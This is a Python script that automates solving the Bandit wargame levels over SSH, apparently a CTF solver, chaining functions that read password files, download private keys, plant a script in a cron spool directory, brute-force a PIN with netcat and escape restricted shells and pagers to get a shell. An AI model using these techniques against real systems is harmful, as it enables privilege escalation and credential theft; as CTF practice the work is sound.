import paramiko, os, time, io, base64
import lib.recursive_file_decompressor as decompressor
import lib.utilities as utilities
import lib.data_utilities as data_utilities
import lib.ssh_utilities as ssh_utilities
import lib.local_utilities as local_utilities
import lib.remote_utilities as remote_utilities
import lib.constants as constants

# Constantes para evitar duplicaciÃ³n de literales
CHMOD_EXECUTABLE = "chmod +x "
SCRIPT_FILENAME = "/script.sh"

# Print credentials
def print_credentials(user,password):
    print(f"[+] Credentials for {user}: {password}")

def _confirm_start_from_bandit0():
    confirm = input(
        "[!] Only bandit0 credentials found. Do you want to start exploitation from bandit0? (y/n): "
    ).strip().lower()
    return confirm in ("y", "yes","Y","YES")

def _select_credential_type(df, start_user):
    start_password = ""
    is_sshkey = False
    for _, row in df.iterrows():
        if start_user == row["user"]:
            password = str(row["password"]).strip()
            sshkey = str(row["sshkey"]).strip()
            if password:
                start_password = password
                is_sshkey = False
            if sshkey:
                start_password = sshkey
                is_sshkey = True
    return start_password, is_sshkey

def get_starting_user(target_user):
    """
    Find the closest available user credential equal to or lower than the target user.
    If only bandit0 is available, prompt the user for confirmation before proceeding.
    """
    fields = ["user", "password", "sshkey"]
    df = data_utilities.get_custom_data_json(as_list=False, is_print=False, fields=fields)
    credentials = df[(df["password"].str.len() > 0) | (df["sshkey"].str.len() > 0)]
    users = list(credentials["user"].to_dict().values())

    target_num = int("".join(filter(str.isdigit, target_user)))
    available_users = [
        (int("".join(filter(str.isdigit, user))), user)
        for user in users
        if int("".join(filter(str.isdigit, user))) <= target_num
    ]

    if not available_users:
        raise ValueError("No credentials available for the selected target.")

    if len(available_users) == 1 and available_users[0][1] == "bandit0":
        if not _confirm_start_from_bandit0():
            print("Operation cancelled by the user.")
            return None, None, None

    start_user = max(available_users)[1]
    start_password, is_sshkey = _select_credential_type(df, start_user)

    return start_user, start_password, is_sshkey

def exploit_from_to(start_user, start_pass, is_sshkey, target_user):
    """
    Executes the exploitation chain from the starting user to the target user.
    Each function returns the password for the next user.
    """
    current_user = start_user
    current_pass = start_pass

    while True:
        # If we reached the target, stop
        if current_user == target_user:
            print(f"Reached target user: {current_user}:{current_pass}")
            print("Saving password....")
            if is_sshkey:
                data_utilities.update_info_for_user(current_user, is_automated=True, new_sshkey=current_pass)
            else:
                data_utilities.update_info_for_user(current_user, is_automated=True, new_password=current_pass)
            time.sleep(2)
            break

        if current_user not in exploit_chain:
            print(f"No exploitation function defined for {current_user}. Stopping.")
            break
        
        # Extract next user (e.g., bandit1 â†’ bandit2)
        current_num = int("".join(filter(str.isdigit, current_user)))
        next_user = f"bandit{current_num + 1}"

        # Execute the exploitation function
        if is_sshkey:
            # If it's a file, means that we're in the exploitation chain
            if os.path.isfile(current_pass):
                f = open(current_pass,"r")
                key_stream = io.StringIO(f.read())
            # Obtain sshkey from base64 stored in .json file
            else:
                private_key_str = base64.b64decode(current_pass).decode("ascii")
                key_stream = io.StringIO(private_key_str)
            pkey = paramiko.RSAKey.from_private_key(key_stream)
            result = exploit_chain[current_user](current_user, pkey, next_user)
        else:
            result = exploit_chain[current_user](current_user, current_pass, next_user)
        
        # Decide what is the next secret
        if "next_password" in result:
            next_pass = result["next_password"]
            is_sshkey = False
        elif "sshkey" in result:
            next_pass = result["sshkey"]
            is_sshkey = True
        else:
            print("No valid credential obtained for next level. Stopping.")
            break
        
        print("Next pass: " + next_user + ":" + str(next_pass))

        current_user = next_user
        current_pass = next_pass

def _execute_ssh_command(current_user, current_pass, command):
    """
    Helper para ejecutar un comando SSH simple y retornar el resultado.
    """
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    _, stdout, _ = client.exec_command(command)
    result = stdout.read().decode().strip()
    client.close()
    return {"next_password": result}

# Exploitation methods
def bandit0_1(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass, 
                                 "cat readme | tail -n 2 | awk 'NF{print $NF}'")

def bandit1_2(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass, "cat ./-")

def bandit2_3(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass, 
                                 "cat \"$(ls -1v . | head -n 1 | xargs -I{} echo ./'{}')\"")


def bandit3_4(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)

    _, stdout, _ = client.exec_command("cd inhere/ && ls -A")
    file_name = stdout.read().decode().strip()
    _, stdout, _ = client.exec_command("cat inhere/"+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit4_5(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "file inhere/* | grep ASCII | awk -F \":\" '{print $1}' | xargs echo | xargs cat")

def bandit5_6(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    _, stdout, _ = client.exec_command("find . -type f -size 1033c ! -executable -exec file {} + | grep ASCII | xargs echo | awk -F \":\" '{print $1}'")
    file_name = stdout.read().decode().strip()
    _, stdout, _ = client.exec_command("cat " + file_name)
    next_password = stdout.read().decode().strip()
    client.close()
    return {"next_password": next_password}

def bandit6_7(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    _, stdout, _ = client.exec_command("find / -user bandit7 -group bandit6 2>/dev/null")
    file_name = stdout.read().decode().strip()
    _, stdout, _ = client.exec_command("cat " + file_name)
    next_password = stdout.read().decode().strip()
    client.close()
    return {"next_password": next_password}

def bandit7_8(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "grep -r \"millionth\" data.txt | awk 'NF{print $NF}'")

def bandit8_9(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "cat data.txt | sort | uniq -u")

def bandit9_10(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "strings data.txt | grep \"====\" | tail -n 1 | awk 'NF{print $NF}'")

def bandit10_11(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "cat data.txt | base64 -d | awk 'NF{print $NF}'")

def bandit11_12(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' | awk 'NF{print $NF}'")

def bandit12_13(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)

    resources_path = local_utilities.create_resources_folder()
    subfolder_path = local_utilities.create_subfolder_on_resources_folder(resources_path, "bandit12_13")
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    client.exec_command("cat ~/data.txt | xxd -r > " + temp_dir + "/data")
    
    sftp = client.open_sftp()
    sftp.get(temp_dir + "/data", os.path.join(subfolder_path, "data.gz"))
    
    file_name = decompressor.decompress_until_plain_text(os.path.join(subfolder_path, "data.gz"), os.path.join(subfolder_path, "temp_output"))
    file = open(file_name, "r")

    next_password = file.read().split()[-1]

    client.close()

    return {"next_password": next_password}

def bandit13_14(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    resources_path = local_utilities.create_resources_folder()
    subfolder_path = local_utilities.create_subfolder_on_resources_folder(resources_path, "bandit13_14")

    sftp = client.open_sftp()
    sftp.get("/home/bandit13/sshkey.private", os.path.join(subfolder_path, "id_rsa"))

    sshkey_file = os.path.join(str(subfolder_path), "id_rsa")
    next_password = utilities.get_b64_file_content(sshkey_file)

    client.close()

    return {"sshkey": next_password}

def bandit14_15(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection_sshkey(current_user, current_pass)

    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit14")
    current_password = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("echo " + current_password + " | nc localhost 30000 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit15_16(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit15")
    current_password = stdout.read().decode().strip()

    _, stdout, _ = client.exec_command("echo " + current_password + " | ncat --ssl localhost 30001 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit16_17(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    utils_path = os.path.join(os.path.dirname(__file__), "../utils")
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path, "port_scan.sh"), temp_dir + "/port_scan.sh")
        
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit16")
    current_password = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command(CHMOD_EXECUTABLE + temp_dir + "/port_scan.sh")
    _, stdout, _ = client.exec_command(temp_dir + "/port_scan.sh > " + temp_dir + "/ports.txt")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    _, stdout, _ = client.exec_command("for port in $(cat " + temp_dir + "/ports.txt); do (echo " + current_password + " | ncat --ssl localhost $port 2>/dev/null | sed -n '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/p'); done > " + temp_dir + "/id_rsa")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    # id_rsa file retieve
    resources_path = local_utilities.create_resources_folder()
    subfolder_path = local_utilities.create_subfolder_on_resources_folder(resources_path, "bandit16_17")
    sftp = client.open_sftp()
    sftp.get(temp_dir + "/id_rsa", os.path.join(subfolder_path, "id_rsa"))
    
    sshkey_file = os.path.join(str(subfolder_path), "id_rsa")
    next_password = utilities.get_b64_file_content(sshkey_file)

    client.close()

    return {"sshkey": next_password}

def bandit17_18(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection_sshkey(current_user, current_pass)

    _, stdout, _ = client.exec_command("diff passwords.old passwords.new | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit18_19(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass, "cat readme")

def bandit19_20(current_user, current_pass, _):
    return _execute_ssh_command(current_user, current_pass,
                                 "/home/bandit19/bandit20-do cat /etc/bandit_pass/bandit20")

def bandit20_21(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    utils_path = os.path.join(os.path.dirname(__file__), "../utils")
    
    script_path = temp_dir + SCRIPT_FILENAME
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path, "bandit21_password.sh"), script_path)
        
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit20")
    current_password = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command(CHMOD_EXECUTABLE + script_path)
    
    _, stdout, _ = client.exec_command(f'{script_path} "{current_password}" "{temp_dir}/log.txt" "{temp_dir}"')
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    _, stdout, _ = client.exec_command("cat " + temp_dir + "/log.txt")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit21_22(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)

    _, stdout, _ = client.exec_command("cat /usr/bin/cronjob_bandit22.sh | tail -n 1 | awk 'NF{print $NF}'")
    temp_file = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cat " + temp_file)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit22_23(current_user, current_pass, next_user):
    client = ssh_utilities.ssh_connection(current_user, current_pass)

    _, stdout, _ = client.exec_command("echo I am user " + next_user + " | md5sum | cut -d ' ' -f 1")
    temp_file = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cat /tmp/" + temp_file)
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit23_24(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    next_password = ""

    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    script_path = temp_dir + SCRIPT_FILENAME
    
    _, stdout, _ = client.exec_command("chmod o+wx " + temp_dir)
    
    _, stdout, _ = client.exec_command(f"echo -e '#!/bin/bash\\n\\ncat /etc/bandit_pass/bandit24 > {temp_dir}/bandit24.password\\nchmod o+r {temp_dir}/bandit24.password' > {script_path}")
    
    _, stdout, _ = client.exec_command(CHMOD_EXECUTABLE + script_path)
    
    _, stdout, _ = client.exec_command(f"cp {script_path} /var/spool/bandit24/foo/testing")
    
    _, stdout, _ = client.exec_command(CHMOD_EXECUTABLE + "/var/spool/bandit24/foo/testing")
        
    while not next_password:
        _, stdout, _ = client.exec_command("cat " + temp_dir + "/bandit24.password 2>/dev/null | tr '\\n' ' '")
        next_password = stdout.read().decode("utf-8").strip()
        if len(stdout.read().decode("utf-8").strip()) != 0:
            break
    
    client.close()

    return {"next_password": next_password}

def bandit24_25(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    _, stdout, _ = client.exec_command("cat /etc/bandit_pass/bandit24")
    current_password = stdout.read().decode().strip()

    _, stdout, _ = client.exec_command("for pin in {0000..9999}; do echo \"" + current_password + " $pin\"; done > " + temp_dir + "/combinations.txt")
    
    _, stdout, _ = client.exec_command("cat " + temp_dir + "/combinations.txt | nc localhost 30002 | grep -vE 'Wrong|Please enter' | grep password | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit25_26(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)

    resources_path = local_utilities.create_resources_folder()
    subfolder_path = local_utilities.create_subfolder_on_resources_folder(resources_path, "bandit25_26")

    sftp = client.open_sftp()
    sftp.get("/home/bandit25/bandit26.sshkey", os.path.join(subfolder_path, "id_rsa"))

    sshkey_file = os.path.join(str(subfolder_path), "id_rsa")
    next_password = utilities.get_b64_file_content(sshkey_file)

    client.close()

    return {"sshkey": next_password}

def bandit26_27(current_user, current_pass, _):
    # To login and perform exploitation
    client = ssh_utilities.ssh_connection_sshkey(current_user, current_pass)
    
    # To obtain a temp folder
    client2 = ssh_utilities.ssh_connection(constants.DEFAULT_USER, constants.DEFAULT_PASSWORD)
    temp_dir = remote_utilities.get_temp_directory(client2, current_user)
    
    # Open interactive channel with a small pseudo-terminal
    channel = client.invoke_shell(width=80, height=2)
    time.sleep(1)

    # Escape more with !sh
    channel.send("v")
    channel.send("\n")
    time.sleep(2)
    channel.send(":set shell=/bin/bash")
    channel.send("\n")
    time.sleep(2)
    channel.send(":shell")
    channel.send("\n")
    time.sleep(2)

    channel.send("id")
    channel.send("\n")
    time.sleep(1)

    channel.send("whoami")
    channel.send("\n")
    time.sleep(1)
    
    channel.send("./bandit27-do cat /etc/bandit_pass/bandit27 > " + temp_dir + "/pass.txt \n")
    time.sleep(1)

    # Wait for command to complete
    start_time = time.time()
    while True:
        if channel.recv_ready():
            channel.recv(1024)  # Limpiar buffer
        if time.time() - start_time > 5:  # Wait 5 seconds
            break
        time.sleep(0.2)

    # Close channel
    channel.send("exit\n")
    client.close()
    
    client2 = ssh_utilities.ssh_connection(constants.DEFAULT_USER, constants.DEFAULT_PASSWORD)
    
    _, stdout, _ = client2.exec_command("cat " + temp_dir + "/pass.txt")
    next_password = stdout.read().decode().strip()
    
    client2.close()
    client.close()

    return {"next_password": next_password}

def bandit27_28(current_user, current_pass, _):
    repo_url = constants.GIT_REPO_BANDIT_27_28
    
    resources_path = local_utilities.create_resources_folder()
    subfolder_path = local_utilities.create_subfolder_on_resources_folder(resources_path, "bandit27_28")
    
    local_utilities.git_clone_repo_bandit(repo_url, current_pass, subfolder_path)
    
    next_password = ""
    for filename in os.listdir(subfolder_path):
        if filename == "README":
            file_path = os.path.join(subfolder_path, filename)
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    next_password = file.read().split()[-1]
            except FileNotFoundError:
                print(f"The file {file_path} was not found.")

    return {"next_password": next_password}

def bandit28_29(current_user, current_pass, _):
    # TODO: Implementar lÃ³gica para bandit28_29
    # Esta funciÃ³n necesita ser completada
    return {"next_password": ""}

def bandit29_30(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    repo_url = constants.GIT_REPO_BANDIT_29_30
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    remote_utilities.git_clone_repo_bandit(client, temp_dir, repo_url, current_pass)

    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git checkout dev")
    
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'password' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit30_31(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    repo_url = constants.GIT_REPO_BANDIT_30_31
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    remote_utilities.git_clone_repo_bandit(client, temp_dir, repo_url, current_pass)

    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git show secret")
    next_password = stdout.read().decode().strip()

    client.close()

    return {"next_password": next_password}

def bandit31_32(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    repo_url = constants.GIT_REPO_BANDIT_31_32
    
    temp_dir = remote_utilities.get_temp_directory(client, current_user)
    
    remote_utilities.git_clone_repo_bandit(client, temp_dir, repo_url, current_pass)

    _, stdout, _ = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'Content' | awk -F ':' '{print $2}' | xargs")
    key_file_content = stdout.read().decode().strip()
    
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && echo '" + key_file_content + "' > " + temp_dir + "/key.txt")
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git add -f key.txt")
    _, stdout, _ = client.exec_command("cd " + temp_dir + " && git commit -m \"Commit file key.txt\"")
    
    # Git push + ssh login
    channel = client.invoke_shell()
    time.sleep(1)

    channel.send("id\n")
    time.sleep(1)

    channel.send("whoami\n")
    time.sleep(1)
    
    channel.send("cd " + temp_dir + " && GIT_SSH_COMMAND=\"ssh -o StrictHostKeyChecking=no\" git push -u origin master\n")
    time.sleep(1)
    
    channel.send(current_pass + "\n")
    time.sleep(1)

    # Read buffer output
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)
    
    next_password = ""
    # Filter output to retrieve password for next level
    for i,line in enumerate(output.splitlines()):
        if "Well done!" in line:
            # Print next line and retrieve last string after split it by spaces
            next_password = output.splitlines()[i+1].split(" ", 1)[-1]
    
    # Close connection
    channel.send("exit\n")
    
    client.close()
    
    return {"next_password": next_password}

def bandit32_33(current_user, current_pass, next_user):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    output = ""
    channel = client.invoke_shell()
    channel.send("$0\n")
    channel.send(f"cat /etc/bandit_pass/{next_user}\n")
    time.sleep(0.5)
    if channel.recv_ready():
        output = channel.recv(5000).decode()
    
    next_password = output.strip().splitlines()[-2]

    channel.close()
    client.close()
    return {"next_password": next_password}

def bandit33_34(current_user, current_pass, _):
    client = ssh_utilities.ssh_connection(current_user, current_pass)
    
    _, stdout, _ = client.exec_command("whoami")
    next_password = stdout.read().decode().strip()
    
    client.close()
    return {"next_password": next_password}

# Complete exploitation chain map
exploit_chain = {
    "bandit0": bandit0_1,
    "bandit1": bandit1_2,
    "bandit2": bandit2_3,
    "bandit3": bandit3_4,
    "bandit4": bandit4_5,
    "bandit5": bandit5_6,
    "bandit6": bandit6_7,
    "bandit7": bandit7_8,
    "bandit8": bandit8_9,
    "bandit9": bandit9_10,
    "bandit10": bandit10_11,
    "bandit11": bandit11_12,
    "bandit12": bandit12_13,
    "bandit13": bandit13_14,
    "bandit14": bandit14_15,
    "bandit15": bandit15_16,
    "bandit16": bandit16_17,
    "bandit17": bandit17_18,
    "bandit18": bandit18_19,
    "bandit19": bandit19_20,
    "bandit20": bandit20_21,
    "bandit21": bandit21_22,
    "bandit22": bandit22_23,
    "bandit23": bandit23_24,
    "bandit24": bandit24_25,
    "bandit25": bandit25_26,
    "bandit26": bandit26_27,
    "bandit27": bandit27_28,
    "bandit28": bandit28_29,
    "bandit29": bandit29_30,
    "bandit30": bandit30_31,
    "bandit31": bandit31_32,
    "bandit32": bandit32_33
}

def main(target):
    start_user, start_password, is_sshkey = get_starting_user(target)
    if start_user and start_password:
            print(f"Starting exploitation from {start_user} with password: {start_password} ğŸ”")
            exploit_from_to(start_user, start_password, is_sshkey, target)
